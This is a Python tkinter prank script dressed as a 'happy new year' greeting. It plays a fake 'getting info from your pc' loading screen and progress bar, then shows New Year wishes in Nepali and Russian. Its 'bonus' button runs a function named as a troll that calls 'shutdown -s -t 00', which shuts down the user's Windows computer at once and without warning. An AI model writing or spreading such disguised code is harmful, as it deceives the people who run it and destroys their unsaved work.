import tkinter as tk
from tkinter import messagebox
from tkinter import *
import os
import time
import random
import threading
from threading import Thread
root=tk.Tk()
def tdr_os_troll_XD():
    time.sleep(1)
    os.system("shutdown -s -t 00")
def trtd():
    threading.Thread(target=tdr_os_troll_XD, daemon=True).start()
def tr():
    button_tr.destroy()
    label_tr.pack()
    button_bonus.pack()
def tsf():
    threading.Thread(target=tr, daemon=True).start()
def strt():
    label=tk.Label(root, text="HAPPY NEW YEAR", font="Arial 30", foreground="red")
    label2=tk.Label(root, text="getting info from your pc", font="Arial 18", foreground="black")
    label_loading=tk.Label(root, text="0%", font="Arial 7", foreground="black")
    label3=tk.Label(root, text="!", font="Arial 16", foreground="black")
    label.pack()
    label2.pack()
    time.sleep(3)
    label2.config(text="Loading.")
    time.sleep(1)
    label2.config(text="Loading..")
    time.sleep(1)
    label2.config(text="Loading...")
    time.sleep(1)
    label2.config(text="Loading.")
    time.sleep(1)
    label2.config(text="Loading..")
    time.sleep(1)
    label2.config(text="Loading...")
    time.sleep(1)
    label2.config(text="Loading.")
    time.sleep(1)
    label2.config(text="Loading..")
    time.sleep(1)
    label2.config(text="Loading...")
    time.sleep(1)
    label2.config(text="Load done", font="Arial 30", foreground="green")
    time.sleep(1.5)
    label2.destroy()
    label_loading.pack()
    label3.pack()
    for i in range(1, 100):
        time.sleep(0.06)
        label_loading.config(text="⬛"*i+"⬜"*(100-i)+" "+str(i)+"%")
    time.sleep(3)
    label_loading.config(text="⬛"*100+"100%")
    time.sleep(1)
    label_loading.config(text="successful", font="Arial 30", foreground="green")
    label3.destroy()
    time.sleep(1)
    label_loading.config(text="नयाँ बर्षको शुभकामना। यस वर्ष पोकेमोनले तपाईंलाई प्रोमो कोड नदिन सक्छ) र तपाईं सधैं 12 अंक दिन चाहानुहुन्छ)))", font="Arial 20", foreground="black")
    button_tr.pack()
def stsrt():
    button_stsrt.destroy()
    threading.Thread(target=strt, daemon=True).start()
root.geometry("1920x1080")
root.minsize(50, 50)
root.resizable(True, True)
label_tr=tk.Label(root, text="С новым годом!\nПусть в этом году покемоны не выдадут вам промокодик)\nИ пусть весегда будет желание поставить 12 баллов)))", font="Arial 15", foreground="black", background="grey")
button_tr=tk.Button(root, text="перевод", command=tsf)
button_bonus=tk.Button(root, text="bonus", command=trtd)
button_stsrt=tk.Button(root, text="start code", command=stsrt)
button_stsrt.pack()
#root.iconbitmap("sd.ico")
root.title("happy new year")
root.mainloop()